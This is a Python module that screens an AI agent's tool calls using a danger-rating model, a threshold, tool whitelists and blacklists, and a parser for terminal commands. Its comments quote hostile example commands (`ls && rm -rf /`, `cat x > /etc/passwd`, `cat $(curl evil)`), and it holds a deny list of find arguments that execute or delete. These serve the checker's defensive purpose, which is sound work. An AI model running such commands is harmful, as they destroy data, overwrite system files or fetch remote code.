"""Safety check for tool calls.

main.py hands every tool call to check() before running it, along with the
THRESHOLD the chat is on. What comes back is one of three words - run, ask,
skip - and main.py does that.

## The threshold

One number, 0 to 10: the highest danger rating a call can be given and still
run unattended.

  0     ask about every call. No model is asked - there is nothing to ask it,
        because no rating would clear the bar.
  1-9   send the call to the checking model for a 0-10 rating, run it if the
        rating is at or under the number, otherwise ask the human.
  10    run everything. No model is asked, for the same reason as 0.

The scale the prompt asks the model for IS the setting. There is no table of
named levels in between, so nothing to map, nothing to keep in sync, and no
level wording to drift away from what the prompt actually says.

## Who picks the number

threshold_for() resolves it, most specific first: the chat's own (its settings
.json, written by the slider in the corner), then the old True/False `safety`
flag that predates it, then the settings page's default - "safety_threshold",
or "cron_safety_threshold" for a scheduled run, which passes its own
`default_key`. See its docstring - the back-compatibility there is load-bearing,
since every chat and cron job on disk was written before thresholds existed.

## The prompt, and the chat's own additions

The prompt lives in settings.py's DEFAULTS ("safety_prompt"), editable on the
settings page - not here, so this file has no prompt text of its own to fall
out of sync with it. It carries two placeholders, both substituted with a
plain string replace so a stray { or } elsewhere is harmless:

  {call}   the call being judged. Required; a prompt without it would ask
           about nothing, so one that lacks it falls back to the global prompt.
  {extra}  extra rules for this run ("anything touching Google Drive is
           fine"), appended at the end if the prompt has no {extra} of its own.
           A chat's own rules come down here, and so does a cron run's - the
           settings page's cron addendum, the job's task, and the job's own
           rules, composed by cron.py into one block. The extra block may
           itself say {call}, which is substituted after it is inserted (see
           _compose) - a long block can then end on the call it is about.

A caller can also replace the prompt outright (check's `prompt`): a cron job's
"safety_prompt" in cron.json, or a chat that wanted to rewrite the whole thing.
The checking model and the two lists stay global either way - only the wording
of the question changes, never who answers it.

## Old prompts still work

A prompt written before ratings existed asked for a "{true}" marker instead of
a number, and plenty are stored in chats and cron.json. is_rating_prompt()
tells the two apart and _legacy_verdict() reads the old kind exactly as it was
always read, so nothing that worked yesterday stops working. Such a prompt
cannot express a threshold, though, so on one every setting from 1 to 9
behaves identically - the settings page says so where it can be seen.

## The two lists

"safety_whitelist" and "safety_blacklist" in settings.py, edited on the same
tab, read per call so a rule added there applies to the very next tool call
without a restart. They bracket everything above, at EVERY threshold: a
whitelisted TOOL NAME runs without being asked about, a blacklisted PHRASE
anywhere in the call goes to the human without being asked about, and only
then does the number get a say. The blacklist applying at 10 too is the point
of it - a safety net that the loosest setting is the only one to skip would be
no net at all.
"""

import json
import re
import shlex
import time

import provider
import settings
import turnctx
import usage

PINK = "\033[95m"
RESET = "\033[0m"

# What check() returns, and what main.py does with each.
RUN = "run"     # vetted and allowed - run it
ASK = "ask"     # stop and put it to the human
SKIP = "skip"   # not checked at all - run it, and say it was not checked

# Set by a front-end that shows the verdict itself. The server wants these
# lines - they are its journal - but cli.py draws the check into the turn it is
# rendering (main.py's on_safety), and the same text arriving a second time as
# a raw print lands in the middle of a half-drawn tool block.
quiet = False

# Introduces the extra rules inside the prompt. They are stated as beating the
# scale rather than sitting beside it, because that is what they are for: the
# scale calls sending a file somewhere a 4, and the whole reason to type a rule
# is that in THIS run it isn't. "This run" rather than "this chat" because a
# cron job's rules - and the task it was set - arrive down the same channel.
_EXTRA_HEAD = ("\nThe owner has given extra rules for this run. They "
               "override the scale above wherever they disagree:\n\n")

# "DANGER: 7 - ..." is what the prompt asks for; the [:\-=]* tolerates a model
# that writes "DANGER 7", "DANGER = 7" or "DANGER:7".
_RATED = re.compile(r"danger\s*[:\-=]*\s*(\d{1,2})", re.I)
# Fallback for a model that answered with the number and nothing else, or put
# its prose first. Any 1-2 digit run will do - it is clamped below.
_ANY_NUMBER = re.compile(r"\b(\d{1,2})\b")


def _note(text):
    """Log a line, but never at the cost of the turn. This runs on EVERY tool
    call, and stdout isn't always a live terminal - a server started from a
    terminal that has since been closed writes to a dead fd, and print() then
    raises OSError. Uncaught, that killed the whole turn mid tool-call: the
    call was already in the history, the result never arrived, and the user
    saw the agent simply stop. A dropped log line is never worth that."""
    if quiet:
        return
    try:
        print(PINK + "[validate] " + text + RESET)
    except OSError:
        pass


def _canonical(call):
    """A stable text rendering of a parsed {"tool", "args"} call - the same
    shape regardless of whether the model wrote it as regexed JSON/DSML text
    or a provider returned it as a native structured tool_call. Everything
    below reads this one representation rather than whatever syntax the
    model happened to use that turn."""
    return (call.get("tool") or "") + "(" + json.dumps(call.get("args", {})) + ")"


def _entries(values):
    """One of the safety tab's two lists, ready to match on: stripped,
    lower-cased, and with the empty ones dropped.

    The empties matter. Both lists are typed into a form, so a row left blank
    or a stray trailing comma reaches here as "" - and "" is in every string
    there has ever been, so a single blank blacklist row would block every
    tool call the agent ever makes. Lower-casing is the same kind of
    tolerance: the call text is already lower-cased, and a user who typed
    "Main.py" meant the file, not a different one."""
    return [v.strip().lower() for v in values if v and v.strip()]


# ---- the threshold ----------------------------------------------------------

def clamp(value, fallback=None):
    """`value` as a usable threshold, or `fallback` if it isn't one. bool is
    refused explicitly because bool is an int in Python and True would
    otherwise sail in as the threshold 1."""
    if isinstance(value, int) and not isinstance(value, bool):
        return max(settings.SAFETY_MIN, min(settings.SAFETY_MAX, value))
    return fallback


def says(threshold):
    """What a threshold does, in as few words as it takes - "allows 7 and
    below". The scale is a scale, so a position on it explains itself and there
    are no level names to keep in step with anything.

    Here so that every Python front-end says it the same way (/cronsafety does,
    and anything else that reports a number back). The web UI has the same three
    lines in its own safetySays(), where the number is drawn."""
    if threshold <= settings.SAFETY_MIN:
        return "asks every time"
    if threshold >= settings.SAFETY_MAX:
        return "no checks"
    return "allows " + str(threshold) + " and below"


def threshold_for(threshold=None, safety=None, chosen=None,
                  default_key="safety_threshold"):
    """The threshold a turn actually runs under, most specific answer first.

    1. `threshold` - what the chat (or a cron job) was set to. The normal path
       once anything has touched the slider.
    2. `safety` - the True/False flag that predates the number and is still
       present in every chat folder on disk written before it. False meant
       "never check this one", which is exactly 10. True meant "do check this
       one", which is the default unless that default is itself 10 - a chat
       that explicitly asked to be checked must not resolve to "check
       nothing", so it lands on the strictest setting instead of being quietly
       ignored.
    3. The settings page's default - "safety_threshold", or whichever of
       settings.THRESHOLD_KEYS `default_key` names. Cron passes
       "cron_safety_threshold": a scheduled run has its own default because
       nobody is there to be asked, and one caller wanting a different DEFAULT
       is no reason for it to resolve the order differently.

    "safety_validation" - the old global on/off switch - is honoured at step 3
    only: off means an install that had checking disabled keeps it disabled,
    while a chat that has since been given a number of its own still gets it.
    That ordering is what lets the old switch and the new slider coexist
    without either surprising the other."""
    chosen = chosen or settings.load()
    fallback = clamp(chosen.get(default_key), 3)

    named = clamp(threshold)
    if named is not None:
        return named

    if safety is False:
        return settings.SAFETY_MAX
    if safety is True:
        return fallback if fallback < settings.SAFETY_MAX else settings.SAFETY_MIN

    if not chosen["safety_validation"]:
        return settings.SAFETY_MAX
    return fallback


# ---- reading the checking model's answer ------------------------------------

def is_rating_prompt(text):
    """Whether `text` is a prompt that asks for a 0-10 rating (the current
    kind) rather than a "{true}" marker (the kind that predates levels).

    Asked of the prompt, not of the answer, because it decides how the answer
    is read - and because the settings page wants to say "this prompt can't
    drive the thresholds" while it is being edited, not after a tool call has
    already been judged by it."""
    if not text:
        return False
    lowered = text.lower()
    # A prompt that says {true} anywhere is asking for the marker, whatever
    # else it also mentions. Only when it doesn't is a mention of the rating
    # taken as the format it is asking for.
    if "{true}" in lowered:
        return False
    return "danger" in lowered or "0-10" in lowered or "0 to 10" in lowered


def _rating(reply):
    """The 0-10 danger rating out of the checking model's reply, or None if it
    said no number at all.

    Clamped rather than rejected at the top end: a model that answers "12" has
    understood the question and overshot the scale, and reading that as "no
    rating" would fail it closed as if it had answered nothing. Clamping to 10
    fails it closed in the direction it actually meant."""
    match = _RATED.search(reply) or _ANY_NUMBER.search(reply)
    if not match:
        return None
    return min(int(match.group(1)), 10)


def _legacy_verdict(reply):
    """A pre-levels prompt's answer: safe if it wrote the "{true}" marker.

    Kept exactly as it always was, because prompts written against it are
    sitting in cron.json and in chat folders and must not change meaning under
    their authors - with one narrowing that can only ever make it safer. Those
    prompts ask for "{false}" when the call is dangerous, and a reply carrying
    that marker is now unsafe whatever else it says. Without it, "not {true},
    this is {false}" read as SAFE, because the test was only ever whether the
    substring appeared anywhere."""
    lowered = reply.lower()
    if "{false}" in lowered:
        return False
    return "{true}" in lowered


def _compose(prompt, call_text, extra):
    """The prompt as it goes on the wire: the extra rules placed where the prompt
    asks for them, and the call substituted in.

    A prompt with no {extra} of its own still gets them - appended at the end -
    rather than having them silently dropped. Dropping would be the worse
    failure by far: the rule would be typed, saved, shown in the dropdown as
    active, and do nothing.

    The call goes in LAST, after the extra block is already part of the text, so
    a {call} written inside the extra rules is substituted too. That is what lets
    a long extra block end by restating the call it is about - which a cron run's
    does, and needs to: its block carries the job's whole task, and a checking
    model handed two thousand words of task between the call and the question
    answers about the task. Restating it is the difference between "rate this
    call" and "rate this job"."""
    body = prompt
    block = _EXTRA_HEAD + extra.strip() + "\n" if (extra or "").strip() else ""
    if "{extra}" in body:
        body = body.replace("{extra}", block)
    elif block:
        body = body + "\n" + block
    return body.replace("{call}", call_text)


# ---- the check itself -------------------------------------------------------

# ---------------------------------------------------------------------------
# The terminal whitelist
#
# The tool whitelist above trusts a whole TOOL, which is no use for the
# terminal: "run any command on this computer" is not a thing to trust
# wholesale, but `ls` and `git status` are, and those are most of what the
# terminal is actually asked to do. Without this every one of them costs a
# full round trip to the checking model before anything runs - on the tool
# that gets called more than all the others put together.
#
# So the terminal is trusted per COMMAND. settings' "terminal_whitelist" is a
# list of commands that may run unasked; a call whose every command is on it
# skips the model, and anything else goes to the model exactly as before.
#
# The rules are deliberately narrow, because the failure that matters here is
# a dangerous command talked past the list rather than a safe one sent to the
# model unnecessarily:
#
#   - the command is split on the shell's own separators (&& || ; | and
#     newlines) and EVERY piece has to be on the list. `ls && rm -rf /` is two
#     commands and the second one decides it.
#   - an entry matches on whole leading words, so "git status" allows exactly
#     that and not `git push`, and "ls" does not allow `lsof`.
#   - anything that can reach outside the command being read is refused
#     outright: redirection, command substitution, background, globs into a
#     shell that expands them. See _SHELL_CHARS.
#   - a few arguments turn a reading command into a writing one - find's
#     -exec and -delete above all - and are refused wherever they appear.
#
# Anything this cannot parse with certainty (unbalanced quotes, an empty
# piece) is not on the list, and goes to the model. "I could not tell" and
# "it is fine" must never be the same answer.

# Characters that give a command a reach beyond itself. Checked on the raw
# text of each piece AFTER the separators above have been split off, so a `|`
# or `&&` between two whitelisted commands is fine while a stray `&` or any
# `>` is not.
#
#   > <   redirection - `cat x > /etc/passwd` reads and then writes
#   $ `   substitution - `cat $(curl evil)` runs something the list never saw
#   &     background, once && has been split off - work that outlives the check
#   \n    a second command by another name, and _pieces splits on it anyway
#   (){}  subshells and brace expansion
_SHELL_CHARS = "><$`&(){}"

# Arguments that turn a reading command into one that writes or runs something
# else. Matched as whole arguments, so a FILE called "-delete" is not one of
# these and neither is `grep -- --delete`.
_UNSAFE_ARGS = {"-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint",
                "-fprintf", "-fls", "--exec"}

# Where one command ends and the next begins. Longest first, so && is never
# read as two &.
_SEPARATORS = ("&&", "||", ";", "|", "\n")


def _pieces(command):
    """`command` split into the individual commands it actually runs."""
    parts = [command]
    for sep in _SEPARATORS:
        parts = [bit for part in parts for bit in part.split(sep)]
    return [p.strip() for p in parts]


def _listed(words, allowed):
    """Whether `words` (one command, already tokenised) starts with any entry
    on `allowed` - matched whole word by whole word, so "git status" allows
    `git status --short` and nothing else that begins with "git"."""
    for entry in allowed:
        wanted = entry.split()
        if wanted and words[:len(wanted)] == wanted:
            return True
    return False


def terminal_allowed(call, allowed):
    """Whether this terminal call is one the whitelist says can just run.

    False for every call this cannot be certain about, which includes every
    call that is not the terminal, an empty whitelist, and anything it cannot
    parse. The caller sends those to the checking model, which is exactly
    what happened before this existed."""
    if not allowed or (call.get("tool") or "").lower() != "terminal":
        return False
    args = call.get("args") or {}
    command = args.get("command")
    if not isinstance(command, str) or not command.strip():
        return False
    # `input` writes into whatever is sitting at the prompt - a password, a
    # y/N, a line for a REPL - and what that reaches is the running program,
    # not `command`. There is nothing here to check it against, so a call
    # carrying one is the model's to judge however harmless `command` looks.
    if args.get("input") is not None:
        return False

    for piece in _pieces(command):
        if not piece:
            return False            # `ls &&` - malformed, so not understood
        if any(ch in piece for ch in _SHELL_CHARS):
            return False
        try:
            words = shlex.split(piece)
        except ValueError:
            return False            # unbalanced quotes - not parseable, not trusted
        if not words:
            return False
        if any(w in _UNSAFE_ARGS for w in words):
            return False
        if not _listed(words, allowed):
            return False
    return True


def check(call, threshold, prompt=None, extra=None):
    """(outcome, reason) for one tool call - outcome being RUN, ASK or SKIP,
    and reason the one line to show beside it.

    `call` is the PARSED {"tool", "args"} dict - the same shape
    tool_processor.process() runs, not the model's raw call text - so this
    works identically whether the call was regexed out of generated text or
    arrived as a provider's native structured tool_call, and so the whitelist
    below matches the actual tool name rather than a substring of the whole
    call (a command whose ARGUMENT happened to contain "screenshot_tool" used
    to false-positive the old text-substring check).

    `threshold` is the 0-10 number out of threshold_for(). `prompt` replaces
    the global prompt entirely; `extra` is added to whichever prompt is used.

    Any error is ASK, so a broken check fails closed rather than open."""
    # A stopped turn asks nothing. This check is a whole extra model round-trip
    # on the way to a call that is no longer going to be run, and it used to be
    # one of the longest stretches of a turn with no way to interrupt it - the
    # user pressed stop and then waited out a request about work already
    # abandoned. Raising here (rather than returning "unsafe") keeps it out of
    # the validation log too: nothing was checked, because nothing is running.
    turnctx.check()

    text = _canonical(call)
    call_lower = text.lower()
    tool_name = (call.get("tool") or "").lower()

    # One read for all of it: the lists and the prompt come out of the same
    # settings file, and this runs on every single tool call.
    chosen = settings.load()

    # Whitelist - trusted tools run at any threshold, without being asked about.
    # Matched on the parsed tool name exactly, not a substring of the call.
    if tool_name in _entries(chosen["safety_whitelist"]):
        _note("whitelisted tool: " + tool_name + " - allowed")
        return RUN, "whitelisted tool (" + tool_name + ")"

    # Blacklist - at every threshold, 10 included. Scanned across the whole
    # canonical text (tool + args), not just the tool name: what this is meant
    # to catch is usually a path ARGUMENT naming a core file, not the tool.
    for phrase in _entries(chosen["safety_blacklist"]):
        if phrase in call_lower:
            _note("blacklisted phrase: " + phrase + " - asking")
            return ASK, ("This call names a blocked phrase (" + phrase
                         + ") from the safety tab.")

    # Terminal commands the settings page says can just run. AFTER the
    # blacklist, unlike the tool whitelist above, and the difference is
    # deliberate: a blacklisted phrase is the user saying "never this without
    # asking me", and a list of ordinary commands must not be able to talk
    # over it. Before the thresholds, because being on the list is an answer
    # at every level from 1 to 9 - the same as being a whitelisted tool.
    if terminal_allowed(call, _entries(chosen["terminal_whitelist"])):
        _note("whitelisted command: " + text + " - allowed")
        return RUN, "whitelisted terminal command"

    # The two ends never reach the checking model. There is no rating it could
    # give that would change the answer, so asking for one would be a paid
    # round-trip to be ignored - and, at 0, a model told to always refuse
    # would sometimes not.
    if threshold >= settings.SAFETY_MAX:
        return SKIP, ""
    if threshold <= settings.SAFETY_MIN:
        _note("threshold 0 - asking")
        return ASK, "this chat asks about every tool call (safety 0)"

    if prompt and "{call}" not in prompt:
        _note("custom safety prompt has no {call} placeholder - using the global one")
        prompt = None
    prompt = prompt or chosen["safety_prompt"]

    # Recorded like any other request, because that is what it is. This one
    # fires on EVERY tool call rather than once a turn, so on a working agent
    # there are more safety checks than there are messages - which is exactly
    # the thing nobody can see without writing it down. See usage.py's KINDS.
    asked = _compose(prompt, text, extra)
    spend = {}
    started = time.time()
    ctx = turnctx.current()
    try:
        reply = provider.get_response(
            asked,
            provider=chosen["verify_provider"],
            model=chosen["verify_model"],
            usage=spend,
        )
    except Exception as e:
        usage.record("safety", chosen["verify_provider"], chosen["verify_model"],
                     chat=getattr(ctx, "key", None), usage=spend, prompt_text=asked,
                     ms=(time.time() - started) * 1000, ok=False, error=repr(e))
        _note("check failed (" + type(e).__name__ + ": " + str(e) + ") - asking")
        return ASK, ("the safety check itself failed (" + type(e).__name__
                     + "), so this fails closed.")
    usage.record("safety", chosen["verify_provider"], chosen["verify_model"],
                 chat=getattr(ctx, "key", None), usage=spend, prompt_text=asked,
                 reply_text=reply, ms=(time.time() - started) * 1000)

    _note("model said: " + reply.strip())

    if not is_rating_prompt(prompt):
        # An old marker-style prompt. It cannot express a threshold, so every
        # setting from 1 to 9 behaves the same on one - said out loud in the
        # log rather than left to be noticed as "the number does nothing".
        safe = _legacy_verdict(reply)
        _note("marker-style prompt (no 0-10 rating) - " + ("allowed" if safe else "asking"))
        reason = reply.replace("{true}", "").replace("{TRUE}", "").strip()
        return (RUN if safe else ASK), reason or "(no reasoning given)"

    rating = _rating(reply)
    if rating is None:
        _note("no rating in the reply - asking")
        return ASK, ("the safety check gave no danger rating, so this fails "
                     "closed: " + reply.strip()[:200])

    # The number leads the line wherever the reply put it, so the row reads
    # "4/10, this chat allows 3 - ..." and the verdict needs no explaining.
    reason = (str(rating) + "/10, this chat allows " + str(threshold) + " - "
              + _RATED.sub("", reply.strip(), count=1).lstrip(" -:").strip())
    safe = rating <= threshold
    _note("rated " + str(rating) + " against threshold " + str(threshold)
          + " - " + ("allowed" if safe else "asking"))
    return (RUN if safe else ASK), reason


def validate_tool_use(call, prompt=None):
    """(safe, reasoning) for one call at the settings page's own threshold.

    The shape check() replaced, kept because it is the simple question - "is
    this call all right?" - and there are callers that only want that: the
    stop-path test harness patches it, and anything vetting a call outside a
    chat has no threshold to pass. Inside a turn, use check(): a turn HAS a
    threshold, and flattening three outcomes into two loses the difference
    between "not checked" and "checked and allowed"."""
    outcome, reason = check(call, threshold_for(), prompt=prompt)
    return outcome != ASK, reason
